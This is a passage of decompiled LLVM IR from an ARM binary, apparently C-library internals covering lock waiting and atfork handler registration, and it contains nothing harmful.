  store i32 %v2_d794, i32* %r1.global-to-local, align 4
  %v1_d798 = add i32 %v2_d794, 24
  %v2_d798 = inttoptr i32 %v1_d798 to i32*
  %v3_d798 = load i32, i32* %v2_d798, align 4
  store i32 %v3_d798, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_d79c = icmp eq i32 %v3_d798, 0
  br i1 %v2_d79c, label %dec_label_pc_d7b8, label %dec_label_pc_d7a4

dec_label_pc_d7a4:                                ; preds = %dec_label_pc_d794
  %v1_d7a4 = add i32 %v2_d794, 20
  %v2_d7a4 = inttoptr i32 %v1_d7a4 to i32*
  %v3_d7a4 = load i32, i32* %v2_d7a4, align 4
  store i32 %v3_d7a4, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 129, i32* %r1.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_d7b8

dec_label_pc_d7b8:                                ; preds = %dec_label_pc_d78c, %dec_label_pc_d7a4, %dec_label_pc_d794
  %v1_d7b8 = add i32 %v0_d794, 4
  %v2_d7b8 = inttoptr i32 %v1_d7b8 to i32*
  %v3_d7b8 = load i32, i32* %v2_d7b8, align 4
  store i32 %v3_d7b8, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_d7bc = icmp eq i32 %v3_d7b8, 0
  br i1 %v2_d7bc, label %dec_label_pc_d7c4, label %dec_label_pc_d730

dec_label_pc_d7bcthread-pre-split:                ; preds = %dec_label_pc_d714, %dec_label_pc_d70c, %dec_label_pc_d6ac
  %v0_d7bc.pr = load i32, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_d7bc11 = icmp eq i32 %v0_d7bc.pr, 0
  br i1 %v2_d7bc11, label %dec_label_pc_d7c4, label %dec_label_pc_d730

dec_label_pc_d7c4:                                ; preds = %dec_label_pc_d7b8, %dec_label_pc_d7bcthread-pre-split
  %v0_d7c4.pre = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_d7c4.pre, i32* %r0.global-to-local, align 4
  ret i32 %v0_d7c4.pre

; uselistorder directives
  uselistorder i32 %v0_d7bc.pr, { 1, 0 }
  uselistorder i32 %v3_d7b8, { 1, 2, 0 }
  uselistorder i32 %v1_d780, { 1, 0, 2, 3 }
  uselistorder i32 %v0_d77c, { 1, 0, 2 }
  uselistorder i32 %v1_d760.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_d700, { 1, 0, 2 }
  uselistorder i32 %v1_d6e4.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_d6d4, { 1, 0 }
  uselistorder i32 %v0_d578, { 1, 0, 2 }
  uselistorder i32 %v1_d55c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_d534, { 2, 1, 0, 3 }
  uselistorder i32 %v0_d50c, { 1, 0, 2 }
  uselistorder i32 %v1_d4f0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v2_d4b8, { 1, 0, 2 }
  uselistorder i32 %v0_d498, { 1, 0, 2 }
  uselistorder i32 %v1_d47c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v3_d45c, { 0, 1, 2, 3, 5, 4, 6, 7 }
  uselistorder i32* %r8.global-to-local, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 14, 13, 0 }
  uselistorder i32* %r6.global-to-local, { 6, 0, 4, 5, 7, 1, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 3, 2, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 4, 3, 5, 6, 8, 7, 9, 10, 12, 11, 13, 14, 16, 15, 17 }
  uselistorder i32* %r3.global-to-local, { 5, 6, 7, 9, 8, 1, 10, 11, 12, 13, 15, 14, 3, 16, 17, 18, 19, 20, 21, 22, 24, 23, 2, 25, 26, 27, 29, 28, 0, 30, 31, 33, 32, 4, 34 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 13, 11, 12 }
  uselistorder i1* %cpsr_c.global-to-local, { 2, 12, 6, 7, 8, 10, 9, 4, 11, 13, 14, 16, 15, 5, 17, 18, 19, 31, 32, 20, 21, 23, 22, 0, 24, 25, 26, 28, 27, 1, 30, 29, 3 }
  uselistorder label %dec_label_pc_d7c4, { 1, 0 }
  uselistorder label %dec_label_pc_d7b8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_d780, { 2, 1, 0 }
  uselistorder label %dec_label_pc_d768, { 1, 0 }
  uselistorder label %bb76, { 1, 0 }
  uselistorder label %dec_label_pc_d704, { 2, 1, 0 }
  uselistorder label %dec_label_pc_d6ec, { 1, 0 }
  uselistorder label %bb74, { 1, 0 }
  uselistorder label %dec_label_pc_d57c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_d564, { 1, 0 }
  uselistorder label %dec_label_pc_d510, { 2, 1, 0 }
  uselistorder label %dec_label_pc_d4f8, { 1, 0 }
  uselistorder label %bb72, { 1, 0 }
  uselistorder label %dec_label_pc_d49c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_d484, { 1, 0 }
  uselistorder label %dec_label_pc_d520.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_d450, { 1, 0 }
}

define i32 @__lll_lock_wait_private(i32* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_d7fc = load i32, i32* @r4, align 4
  store i32 %v3_d7fc, i32* %stack_var_-16, align 4
  %v0_d800 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_d800, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_d804

dec_label_pc_d804:                                ; preds = %dec_label_pc_d884.dec_label_pc_d804_crit_edge, %entry
  %v0_d808 = phi i32 [ %v0_d808.pre, %dec_label_pc_d884.dec_label_pc_d804_crit_edge ], [ %v0_d800, %entry ]
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %v0_d808, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r4.global-to-local, align 4
  %v1_d81017 = inttoptr i32 %v0_d808 to i32*
  %v2_d81018 = load i32, i32* %v1_d81017, align 4
  %v3_d81420 = icmp ne i32 %v2_d81018, 0
  store i1 %v3_d81420, i1* %cpsr_c.global-to-local, align 1
  %v9_d81426 = icmp eq i32 %v2_d81018, 1
  br i1 %v9_d81426, label %dec_label_pc_d81c, label %dec_label_pc_d834

dec_label_pc_d81c:                                ; preds = %dec_label_pc_d804, %dec_label_pc_d81c.dec_label_pc_d810_crit_edge
  %v0_d81c27 = phi i32 [ %v1_d814.pre, %dec_label_pc_d81c.dec_label_pc_d810_crit_edge ], [ 1, %dec_label_pc_d804 ]
  store i32 %v0_d81c27, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_d82c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_d82c, label %dec_label_pc_d830, label %dec_label_pc_d81c.dec_label_pc_d810_crit_edge

dec_label_pc_d81c.dec_label_pc_d810_crit_edge:    ; preds = %dec_label_pc_d81c
  %v0_d810.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_d814.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_d810 = inttoptr i32 %v0_d810.pre to i32*
  %v2_d810 = load i32, i32* %v1_d810, align 4
  %v3_d814 = icmp uge i32 %v2_d810, %v1_d814.pre
  store i1 %v3_d814, i1* %cpsr_c.global-to-local, align 1
  %v9_d814 = icmp eq i32 %v2_d810, %v1_d814.pre
  br i1 %v9_d814, label %dec_label_pc_d81c, label %dec_label_pc_d834

dec_label_pc_d830:                                ; preds = %dec_label_pc_d81c
  %v0_d830 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_d834

dec_label_pc_d834:                                ; preds = %dec_label_pc_d804, %dec_label_pc_d81c.dec_label_pc_d810_crit_edge, %dec_label_pc_d830
  %v0_d834 = phi i32 [ %v0_d830, %dec_label_pc_d830 ], [ %v2_d81018, %dec_label_pc_d804 ], [ %v2_d810, %dec_label_pc_d81c.dec_label_pc_d810_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_d834 = icmp eq i32 %v0_d834, 0
  %v0_d858.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v2_d834, label %dec_label_pc_d854, label %dec_label_pc_d83c

dec_label_pc_d83c:                                ; preds = %dec_label_pc_d834
  store i32 %v0_d858.pre, i32* %r0.global-to-local, align 4
  %v0_d840 = load i32, i32* %r1.global-to-local, align 4
  %v1_d840 = add i32 %v0_d840, 126
  store i32 %v1_d840, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_d854

dec_label_pc_d854:                                ; preds = %dec_label_pc_d834, %dec_label_pc_d83c
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %v0_d858.pre, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_d86028 = inttoptr i32 %v0_d858.pre to i32*
  %v2_d86029 = load i32, i32* %v1_d86028, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_d86436 = icmp eq i32 %v2_d86029, 0
  br i1 %v9_d86436, label %dec_label_pc_d86c, label %dec_label_pc_d884

dec_label_pc_d86c:                                ; preds = %dec_label_pc_d854, %dec_label_pc_d86c.dec_label_pc_d860_crit_edge
  %v0_d86c37 = phi i32 [ %v1_d864.pre, %dec_label_pc_d86c.dec_label_pc_d860_crit_edge ], [ 0, %dec_label_pc_d854 ]
  store i32 %v0_d86c37, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_d87c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_d87c, label %dec_label_pc_d880, label %dec_label_pc_d86c.dec_label_pc_d860_crit_edge

dec_label_pc_d86c.dec_label_pc_d860_crit_edge:    ; preds = %dec_label_pc_d86c
  %v0_d860.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_d864.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_d860 = inttoptr i32 %v0_d860.pre to i32*
  %v2_d860 = load i32, i32* %v1_d860, align 4
  %v3_d864 = icmp uge i32 %v2_d860, %v1_d864.pre
  store i1 %v3_d864, i1* %cpsr_c.global-to-local, align 1
  %v9_d864 = icmp eq i32 %v2_d860, %v1_d864.pre
  br i1 %v9_d864, label %dec_label_pc_d86c, label %dec_label_pc_d884

dec_label_pc_d880:                                ; preds = %dec_label_pc_d86c
  %v0_d880 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_d884

dec_label_pc_d884:                                ; preds = %dec_label_pc_d854, %dec_label_pc_d86c.dec_label_pc_d860_crit_edge, %dec_label_pc_d880
  %v0_d884 = phi i32 [ %v0_d880, %dec_label_pc_d880 ], [ %v2_d86029, %dec_label_pc_d854 ], [ %v2_d860, %dec_label_pc_d86c.dec_label_pc_d860_crit_edge ]
  %v1_d884 = phi i32 [ %v0_d880, %dec_label_pc_d880 ], [ 0, %dec_label_pc_d854 ], [ %v1_d864.pre, %dec_label_pc_d86c.dec_label_pc_d860_crit_edge ]
  %v3_d884 = icmp uge i32 %v0_d884, %v1_d884
  store i1 %v3_d884, i1* %cpsr_c.global-to-local, align 1
  %v9_d884 = icmp eq i32 %v0_d884, %v1_d884
  br i1 %v9_d884, label %dec_label_pc_d88c, label %dec_label_pc_d884.dec_label_pc_d804_crit_edge

dec_label_pc_d884.dec_label_pc_d804_crit_edge:    ; preds = %dec_label_pc_d884
  %v0_d808.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_d804

dec_label_pc_d88c:                                ; preds = %dec_label_pc_d884
  %v2_d88c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_d88c, i32* %r4.global-to-local, align 4
  %v1_d890 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_d890

; uselistorder directives
  uselistorder i32 %v0_d880, { 1, 0 }
  uselistorder i32 %v1_d864.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_d814.pre, { 2, 1, 0 }
  uselistorder i32 %v2_d81018, { 0, 2, 1 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3, 5, 4, 6 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 3, 5, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 3, 2, 0, 4, 5, 6, 7 }
  uselistorder label %dec_label_pc_d884, { 2, 1, 0 }
  uselistorder label %dec_label_pc_d86c, { 1, 0 }
  uselistorder label %dec_label_pc_d854, { 1, 0 }
  uselistorder label %dec_label_pc_d834, { 2, 1, 0 }
  uselistorder label %dec_label_pc_d81c, { 1, 0 }
}

define i32 @__linkin_atfork(i32* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_d894 = load i32, i32* @r4, align 4
  store i32 %v3_d894, i32* %stack_var_-24, align 4
  store i32 13148, i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* %r5.global-to-local, align 4
  %v0_d8a4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_d8a4, i32* %r6.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 13148), i32* %r8.global-to-local, align 4
  br label %dec_label_pc_d8ac

dec_label_pc_d8ac:                                ; preds = %dec_label_pc_d8e0.dec_label_pc_d8ac_crit_edge, %entry
  %v0_d8b0 = phi i32 [ %v0_d8b0.pre, %dec_label_pc_d8e0.dec_label_pc_d8ac_crit_edge ], [ %v0_d8a4, %entry ]
  %v1_d8ac = phi i32 [ %v1_d8ac.pre, %dec_label_pc_d8e0.dec_label_pc_d8ac_crit_edge ], [ 13148, %entry ]
  %v0_d8ac = phi i32 [ %v0_d8ac.pre, %dec_label_pc_d8e0.dec_label_pc_d8ac_crit_edge ], [ ptrtoint (i32* @global_var_22290.79 to i32), %entry ]
  %v2_d8ac = add i32 %v0_d8ac, %v1_d8ac
  %v3_d8ac = inttoptr i32 %v2_d8ac to i32*
  %v4_d8ac = load i32, i32* %v3_d8ac, align 4
  store i32 %v4_d8ac, i32* %r4.global-to-local, align 4
  %v2_d8b4 = inttoptr i32 %v0_d8b0 to i32*
  store i32 %v4_d8ac, i32* %v2_d8b4, align 4
  %v0_d8b8 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_d8b8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_d8bc

dec_label_pc_d8bc:                                ; preds = %dec_label_pc_d8c8.dec_label_pc_d8bc_crit_edge, %dec_label_pc_d8ac
  %v0_d8bc = phi i32 [ %v0_d8bc.pre, %dec_label_pc_d8c8.dec_label_pc_d8bc_crit_edge ], [ %v0_d8b8, %dec_label_pc_d8ac ]
  %v1_d8bc = inttoptr i32 %v0_d8bc to i32*
  %v2_d8bc = load i32, i32* %v1_d8bc, align 4
  %v1_d8c0 = load i32, i32* %r4.global-to-local, align 4
  %v3_d8c0 = icmp uge i32 %v2_d8bc, %v1_d8c0
  store i1 %v3_d8c0, i1* %cpsr_c.global-to-local, align 1
  %v9_d8c0 = icmp eq i32 %v2_d8bc, %v1_d8c0
  br i1 %v9_d8c0, label %dec_label_pc_d8c8, label %dec_label_pc_d8e0

dec_label_pc_d8c8:                                ; preds = %dec_label_pc_d8bc
  store i32 %v2_d8bc, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_d8d8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_d8d8, label %dec_label_pc_d8dc, label %dec_label_pc_d8c8.dec_label_pc_d8bc_crit_edge

dec_label_pc_d8c8.dec_label_pc_d8bc_crit_edge:    ; preds = %dec_label_pc_d8c8
  %v0_d8bc.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_d8bc

dec_label_pc_d8dc:                                ; preds = %dec_label_pc_d8c8
  %v0_d8dc = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_d8e0

dec_label_pc_d8e0:                                ; preds = %dec_label_pc_d8bc, %dec_label_pc_d8dc
  %v0_d8e0 = phi i32 [ %v0_d8dc, %dec_label_pc_d8dc ], [ %v2_d8bc, %dec_label_pc_d8bc ]
  %v1_d8e0 = phi i32 [ %v0_d8dc, %dec_label_pc_d8dc ], [ %v1_d8c0, %dec_label_pc_d8bc ]
  %v3_d8e0 = icmp uge i32 %v0_d8e0, %v1_d8e0
  store i1 %v3_d8e0, i1* %cpsr_c.global-to-local, align 1
  %v9_d8e0 = icmp eq i32 %v0_d8e0, %v1_d8e0
  br i1 %v9_d8e0, label %dec_label_pc_d8e8, label %dec_label_pc_d8e0.dec_label_pc_d8ac_crit_edge

dec_label_pc_d8e0.dec_label_pc_d8ac_crit_edge:    ; preds = %dec_label_pc_d8e0
  %v0_d8ac.pre = load i32, i32* %r5.global-to-local, align 4
  %v1_d8ac.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_d8b0.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_d8ac

dec_label_pc_d8e8:                                ; preds = %dec_label_pc_d8e0
  %v2_d8e8 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_d8e8, i32* %r4.global-to-local, align 4
  %v1_d8ec = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_d8ec

; uselistorder directives
  uselistorder i32 %v0_d8dc, { 1, 0 }
  uselistorder i32 %v1_d8c0, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 13148), { 1, 0 }
  uselistorder i32 13148, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_d8e0, { 1, 0 }
}

define i32 @__GI___register_atfork(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_d8f8 = load i32, i32* @r4, align 4
  %v12_d8f8 = load i32, i32* @r7, align 4
  %v15_d8f8 = load i32, i32* @r8, align 4
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* @r6, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 1256), i32* @r5, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 %arg3, i32* @fp, align 4
  %v0_d918 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_d918, i32* @r8, align 4
  store i32 %arg4, i32* @sl, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 1256), i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v2_d92c72 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 1256) to i32*), align 4
  store i32 %v2_d92c72, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_d93074 = icmp eq i32 %v2_d92c72, 0
  br i1 %v9_d93074, label %dec_label_pc_d938, label %dec_label_pc_d950

dec_label_pc_d938:                                ; preds = %entry, %dec_label_pc_d938.dec_label_pc_d92c_crit_edge
  %v0_d93875 = phi i32 [ %v1_d930.pre, %dec_label_pc_d938.dec_label_pc_d92c_crit_edge ], [ 0, %entry ]
  store i32 %v0_d93875, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_d948 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_d948, label %dec_label_pc_d94c, label %dec_label_pc_d938.dec_label_pc_d92c_crit_edge

dec_label_pc_d938.dec_label_pc_d92c_crit_edge:    ; preds = %dec_label_pc_d938
  %v0_d92c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_d930.pre = load i32, i32* @r4, align 4
  %v1_d92c = inttoptr i32 %v0_d92c.pre to i32*
  %v2_d92c = load i32, i32* %v1_d92c, align 4
  store i32 %v2_d92c, i32* %r3.global-to-local, align 4
  %v3_d930 = icmp uge i32 %v2_d92c, %v1_d930.pre
  store i1 %v3_d930, i1* %cpsr_c.global-to-local, align 1
  %v9_d930 = icmp eq i32 %v2_d92c, %v1_d930.pre
  br i1 %v9_d930, label %dec_label_pc_d938, label %dec_label_pc_d950

dec_label_pc_d94c:                                ; preds = %dec_label_pc_d938
  %v0_d94c = load i32, i32* @r4, align 4
  store i32 %v0_d94c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_d950

dec_label_pc_d950:                                ; preds = %entry, %dec_label_pc_d938.dec_label_pc_d92c_crit_edge, %dec_label_pc_d94c
  %v0_d950 = phi i32 [ %v0_d94c, %dec_label_pc_d94c ], [ %v2_d92c72, %entry ], [ %v2_d92c, %dec_label_pc_d938.dec_label_pc_d92c_crit_edge ]
  %v1_d950 = phi i32 [ %v0_d94c, %dec_label_pc_d94c ], [ 0, %entry ], [ %v1_d930.pre, %dec_label_pc_d938.dec_label_pc_d92c_crit_edge ]
  %v3_d950 = icmp uge i32 %v0_d950, %v1_d950
  store i1 %v3_d950, i1* %cpsr_c.global-to-local, align 1
  %v9_d950 = icmp eq i32 %v0_d950, %v1_d950
  br i1 %v9_d950, label %bb48, label %bb

bb:                                               ; preds = %dec_label_pc_d950
  %v1_d954 = load i32, i32* @r5, align 4
  store i32 %v1_d954, i32* %r0.global-to-local, align 4
  br label %bb48

bb48:                                             ; preds = %dec_label_pc_d950, %bb
  store i32 55644, i32* @lr, align 4
  %v1_d958 = xor i1 %v9_d950, true
  call void @__pseudo_cond_branch(i1 %v1_d958, i32 ptrtoint (i32* @global_var_d7fc.235 to i32))
  store i32 1260, i32* %r3.global-to-local, align 4
  store i32 28, i32* %r1.global-to-local, align 4
  %v0_d964 = load i32, i32* @r6, align 4
  %v2_d964 = add i32 %v0_d964, 1260
  %v0_d968.pre = load i32, i32* @r4, align 4
  %tmp49 = icmp ult i32 %v0_d968.pre, 48
  br label %dec_label_pc_d968

dec_label_pc_d968:                                ; preds = %dec_label_pc_d98c, %bb48
  %v0_d98c = phi i32 [ %v2_d98c, %dec_label_pc_d98c ], [ %v2_d964, %bb48 ]
  store i32 %v0_d968.pre, i32* %r2.global-to-local, align 4
  br i1 %tmp49, label %dec_label_pc_d970, label %dec_label_pc_d98c

dec_label_pc_d970:                                ; preds = %dec_label_pc_d968, %dec_label_pc_d980
  %v0_d980 = phi i32 [ %v1_d980, %dec_label_pc_d980 ], [ %v0_d968.pre, %dec_label_pc_d968 ]
  %v3_d970 = mul i32 %v0_d980, 28
  %v4_d970 = add i32 %v3_d970, %v0_d98c
  store i32 %v4_d970, i32* %r3.global-to-local, align 4
  %v1_d974 = add i32 %v4_d970, 24
  %v2_d974 = inttoptr i32 %v1_d974 to i32*
  %v3_d974 = load i32, i32* %v2_d974, align 4
  store i32 %v3_d974, i32* %r3.global-to-local, align 4
  %v2_d978 = icmp eq i32 %v3_d974, 0
  br i1 %v2_d978, label %dec_label_pc_d9c8.loopexit, label %dec_label_pc_d980

dec_label_pc_d980:                                ; preds = %dec_label_pc_d970
  %v1_d980 = add nuw nsw i32 %v0_d980, 1
  store i32 %v1_d980, i32* %r2.global-to-local, align 4
  %tmp50 = icmp ult i32 %v1_d980, 48
  br i1 %tmp50, label %dec_label_pc_d970, label %dec_label_pc_d98c

dec_label_pc_d98c:                                ; preds = %dec_label_pc_d980, %dec_label_pc_d968
  %v1_d98c = inttoptr i32 %v0_d98c to i32*
  %v2_d98c = load i32, i32* %v1_d98c, align 4
  store i32 %v2_d98c, i32* @r7, align 4
  %v2_d990 = icmp eq i32 %v2_d98c, 0
  br i1 %v2_d990, label %dec_label_pc_d998, label %dec_label_pc_d968

dec_label_pc_d998:                                ; preds = %dec_label_pc_d98c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 1348, i32* %r1.global-to-local, align 4
  %v2_d9a0 = call i32 @calloc(i32 1, i32 1348)
  store i32 %v2_d9a0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_d9a4 = icmp eq i32 %v2_d9a0, 0
  br i1 %v2_d9a4, label %bb51, label %dec_label_pc_d9b0

bb51:                                             ; preds = %dec_label_pc_d998
  %v1_d9a8 = load i32, i32* @r7, align 4
  store i32 %v1_d9a8, i32* @r5, align 4
  br label %dec_label_pc_d9f8

dec_label_pc_d9b0:                                ; preds = %dec_label_pc_d998
  store i32 1260, i32* %r2.global-to-local, align 4
  %v0_d9b4 = load i32, i32* @r6, align 4
  %v2_d9b4 = add i32 %v0_d9b4, 1260
  %v3_d9b4 = inttoptr i32 %v2_d9b4 to i32*
  %v4_d9b4 = load i32, i32* %v3_d9b4, align 4
  store i32 %v4_d9b4, i32* %r3.global-to-local, align 4
  store i32 %v2_d9a0, i32* @r7, align 4
  %v2_d9bc = inttoptr i32 %v2_d9a0 to i32*
  store i32 %v4_d9b4, i32* %v2_d9bc, align 4
  %v0_d9c0 = load i32, i32* %r0.global-to-local, align 4
  %v1_d9c0 = load i32, i32* @r6, align 4
  %v2_d9c0 = load i32, i32* %r2.global-to-local, align 4
  %v3_d9c0 = add i32 %v2_d9c0, %v1_d9c0
  %v4_d9c0 = inttoptr i32 %v3_d9c0 to i32*
  store i32 %v0_d9c0, i32* %v4_d9c0, align 4
  store i32 47, i32* %r2.global-to-local, align 4
  %v2_d9cc.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_d9c8

dec_label_pc_d9c8.loopexit:                       ; preds = %dec_label_pc_d970
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br label %dec_label_pc_d9c8

dec_label_pc_d9c8:                                ; preds = %dec_label_pc_d9c8.loopexit, %dec_label_pc_d9b0
  %v2_d9cc = phi i32 [ %v0_d98c, %dec_label_pc_d9c8.loopexit ], [ %v2_d9cc.pre, %dec_label_pc_d9b0 ]
  %v0_d9cc = phi i32 [ %v0_d980, %dec_label_pc_d9c8.loopexit ], [ 47, %dec_label_pc_d9b0 ]
  %v3_d9cc = mul i32 %v0_d9cc, 28
  %v4_d9cc = add i32 %v3_d9cc, %v2_d9cc
  store i32 %v4_d9cc, i32* %r3.global-to-local, align 4
  %v2_d9d4 = add i32 %v4_d9cc, 24
  %v3_d9d4 = inttoptr i32 %v2_d9d4 to i32*
  store i32 1, i32* %v3_d9d4, align 4
  %v0_d9d8 = load i32, i32* %r3.global-to-local, align 4
  %v1_d9d8 = add i32 %v0_d9d8, 4
  store i32 %v1_d9d8, i32* @r5, align 4
  %v2_d9d8 = icmp ugt i32 %v0_d9d8, -5
  store i1 %v2_d9d8, i1* %cpsr_c.global-to-local, align 1
  %v7_d9d8 = icmp eq i32 %v1_d9d8, 0
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_d9e0 = add i32 %v0_d9d8, 28
  %v3_d9e0 = inttoptr i32 %v2_d9e0 to i32*
  store i32 0, i32* %v3_d9e0, align 4
  br i1 %v7_d9d8, label %dec_label_pc_d9f8, label %dec_label_pc_d9e8

dec_label_pc_d9e8:                                ; preds = %dec_label_pc_d9c8
  %v0_d9e8 = load i32, i32* @r5, align 4
  %v1_d9e8 = add i32 %v0_d9e8, 4
  %v2_d9e8 = inttoptr i32 %v1_d9e8 to i32*
  %v3_d9e8 = load i32, i32* @r8, align 4
  store i32 %v3_d9e8, i32* %v2_d9e8, align 4
  %v4_d9e8 = add i32 %v0_d9e8, 8
  %v5_d9e8 = inttoptr i32 %v4_d9e8 to i32*
  %v6_d9e8 = load i32, i32* @sb, align 4
  store i32 %v6_d9e8, i32* %v5_d9e8, align 4
  %v7_d9e8 = add i32 %v0_d9e8, 12
  %v8_d9e8 = inttoptr i32 %v7_d9e8 to i32*
  %v9_d9e8 = load i32, i32* @fp, align 4
  store i32 %v9_d9e8, i32* %v8_d9e8, align 4
  %v0_d9ec = load i32, i32* @sl, align 4
  %v1_d9ec = load i32, i32* @r5, align 4
  %v2_d9ec = add i32 %v1_d9ec, 16
  %v3_d9ec = inttoptr i32 %v2_d9ec to i32*
  store i32 %v0_d9ec, i32* %v3_d9ec, align 4
